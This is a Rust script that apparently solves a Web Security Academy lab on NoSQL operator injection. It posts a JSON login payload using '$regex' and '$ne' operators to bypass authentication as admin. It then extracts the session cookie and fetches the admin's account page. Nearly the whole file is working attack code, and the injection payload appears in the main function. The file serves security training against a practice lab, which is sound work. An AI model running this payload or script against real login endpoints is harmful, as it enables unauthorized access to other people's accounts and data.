/****************************************************************************
*
* Lab: Exploiting NoSQL operator injection to bypass authentication
*
* Hack Steps: 
*      1. Injecting operators in the request body to bypass authentication
*         and login as admin
*      2. Extract session cookie from the response headers
*      3. Fetch the admin profile
*
*****************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a50004d0394f7e880e91c550045008e.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("â¦—1â¦˜ Injecting operators in the request body to bypass authentication.. ");
    flush_terminal();

    let payload = r###"{
                            "username":{
                                "$regex":"admin.*"
                            },
                            "password":{
                                "$ne":""
                            }
                        }"###;
    let login = login_as_admin(&payload);

    let location_header = login.headers().get("Location").unwrap().to_str().unwrap();
    let admin_username = capture_pattern_from_text("id=(.*)", location_header);

    println!("{}", "OK".green());
    print!("â¦—2â¦˜ Extracting session cookie of the admin.. ");
    flush_terminal();

    let session = get_session_cookie(&login);

    println!("{}", "OK".green());
    print!("â¦—3â¦˜ Fetching {} profile.. ", admin_username.yellow());
    flush_terminal();

    fetch_with_session("/my-account", &session);

    println!("{}", "OK".green());
    println!("ðŸ—¹ The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn login_as_admin(json: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Content-Type", "application/json")
        .body(json.to_owned())
        .send()
        .expect(&format!("{}", "â¦—!â¦˜ Failed to bypass authentication".red()))
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "â¦—!â¦˜ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("â¦—!â¦˜ Failed to fetch: {}", path.red()))
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
